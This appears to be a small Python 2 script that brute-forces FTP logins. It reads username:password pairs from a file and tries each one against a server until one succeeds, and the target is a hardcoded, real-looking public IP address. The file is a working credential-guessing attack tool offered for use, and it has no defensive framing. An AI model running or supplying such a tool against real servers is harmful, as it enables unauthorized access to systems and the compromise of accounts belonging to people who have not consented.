# bruteforce_ftpLogin.py
#
#	Des:	- Works alongside "userpass.txt"
#
#	Issues:	1) Needs a debug mode
#			2) Too specific. Make it more general purpose
#
#	Status:	Functional - WIP
#	
#	LU: 01/19/16

import ftplib

TIMEOUT = 20

# --------------------------------------------------------------------------- #
def bruteLogin(hostname, passwdFile):

	open_passwdFile = open(passwdFile, 'r')

	for line in open_passwdFile.readlines():

		userName = line.split(":")[0]
		passWord = line.split(":")[1].strip('\r').strip('\n')
		print "[+] Trying: "+userName+"/"+passWord

		try:
			le_ftp = ftplib.FTP(hostname, timeout=TIMEOUT)
			le_ftp.login(userName, passWord)
			print "\n[*] " + str(hostname) + "FTP login successful: " +\
			userName+"/"+passWord
			le_ftp.quit()
			return (userName, passWord)

		except ftplib.all_errors, e:
			#errorcode_string = str(e).split(None, 1)
			#print "[DEBUG] Error: " + errorcode_string
			print "[-] Failed. Trying next..."

	print "\n[-] Could not brute force FTP credentials."
	return (None, None)

# --------------------------------------------------------------------------- #
def main():
	host = "69.5.29.188"
	passwdFile = "userpass.txt"
	bruteLogin(host, passwdFile)

if __name__ == "__main__":
	main()
